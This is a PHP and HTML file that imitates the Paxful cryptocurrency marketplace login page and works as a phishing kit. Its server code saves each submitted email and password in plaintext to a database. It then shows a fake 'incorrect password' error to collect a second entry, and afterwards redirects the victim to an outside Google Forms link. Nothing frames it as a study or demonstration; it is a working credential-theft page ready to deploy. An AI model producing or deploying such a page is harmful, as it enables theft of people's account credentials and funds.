<?php
// Database configuration
$servername = "";
$port = "";
$username = "";
$password = "";
$dbname = "";

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname, $port);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Start a session to track attempts
session_start();

// Initialize error message variable
$error_message = '';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get email and password from the form
    $email = $conn->real_escape_string($_POST['email']);
    $password = $conn->real_escape_string($_POST['password']);

    // Insert the input into the database
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
    if ($conn->query($sql) !== TRUE) {
        echo "Error: " . $sql . "<br>" . $conn->error;
        exit();
    }

    // Track login attempts
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0; // Initialize the counter
    }

    $_SESSION['login_attempts']++;

    if ($_SESSION['login_attempts'] == 1) {
        // First login attempt: Set the error message
        $error_message = 'Please enter a correct email address and password. Note that both fields may be case-sensitive.';
    } elseif ($_SESSION['login_attempts'] > 1) {
        // Second login attempt: Redirect the user
        header("Location: https://forms.gle/zUWS4xWJv1FCbYbt6");
        exit();
    }
}

// Close the connection
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>Login | Paxful</title>
    <link rel="icon" type="image/x-icon" href="images/favicon.ico" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/responsive.css" />
    <script src="https://cdn.jsdelivr.net/npm/tailwindcss@3.3.3"></script>
<script src="https://cdn.jsdelivr.net/npm/daisyui@2.51.5"></script>
<script src="https://cdn.tailwindcss.com"></script>


    <!-- Include Tailwind CSS via CDN -->
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@3.3.3/dist/tailwind.min.css" rel="stylesheet">

</head>
<body>
    <header class="site_header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                    <a href="#" class="site_logo">
                        <img src="images/logo.png" alt="logo" />
                    </a>
                </div>
            </div>
        </div>
    </header>

    <section class="witget_area custome_scrollbar">
        <div class="left_area">
            <div class="site_content_box">
                <div class="title">
                    <h2>Welcome back!</h2>
                    <p>Don't have an account? <a href="https://accounts.paxful.com/register">Sign up</a></p>
                </div>


                <?php if ($error_message): ?>
    <div class="flex flex-col gap-2">
    <div class="relative w-full rounded-lg p-[14px] text-[13px] [&>svg+div]:-translate-y-0 [&>svg]:absolute [&>svg]:left-3 [&>svg]:top-[14px] [&>svg]:text-foreground [&>svg~*]:pl-5 bg-red-700">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-xcircle size-4">
            <circle cx="12" cy="12" r="10"></circle>
            <path d="m15 9-6 6"></path>
            <path d="m9 9 6 6"></path>
        </svg>
        <div class="text-[13px] leading-[16px] text-white">
            <?php echo $error_message; ?>
        </div>
    </div>
    </div>
<?php endif; ?>

                <div class="form_area">
                    <form method="POST" action="">
                        <div class="mb-3">
                            <label for="Email" class="form-label">Email / Phone Number</label>
                            <input
                                type="email"
                                class="form-control"
                                id="Email"
                                name="email"
                                aria-describedby="emailHelp"
                                placeholder="Email / Phone Number"
                                required
                            />
                        </div>
                        <div class="mb-2 password_box">
                            <label for="myPassword" class="form-label">Password</label>
                            <input
                                type="password"
                                class="form-control"
                                id="myPassword"
                                placeholder="Password"
                                name="password"
                                required
                            />
                            <label class="pass_check">
                                <input type="checkbox" onclick="PasswordFunction()" />
                                <span class="checkmark">
                                    <i class="fas fa-eye-slash"></i>
                                    <i class="fas fa-eye"></i>
                                </span>
                            </label>
                        </div>
                        <div class="forgot_pass">
                            <a href="https://accounts.paxful.com/forgot-password">Forgot password?</a>
                        </div>
                        <button type="submit" class="btn submit_btn" name="signin">Sign in</button>
                    </form>

                </div>
            </div>
        </div>
        <div class="right_area"></div>
    </section>

    <footer class="site_footer">
        <div class="container-fluid" id="cookie-message">
            <div class="row">
                <div class="col-12">
                    <div class="d-flex justify-content-between">
                        <div class="footer_txt">
                            <p>This website uses cookies to ensure you get the best experience on our website.</p>
                            <a href="https://paxful.com/cookie-policy">Learn more</a>
                        </div>
                        <div class="footer_btn">
                            <button type="button" class="btn accept_btn" id="accept-cookies">I accept</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <script src="js/jquery-3.3.1.slim.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/custom.js"></script>

    <script>
        function PasswordFunction() {
            var x = document.getElementById("myPassword");
            if (x.type === "password") {
                x.type = "text";
            } else {
                x.type = "password";
            }
        }

        document.getElementById("accept-cookies").addEventListener("click", function () {
            document.getElementById("cookie-message").style.display = "none";
            document.cookie = "cookiesAccepted=true; path=/; max-age=" + 60 * 60 * 24 * 365; // 1 year
        });
    </script>
</body>
</html>
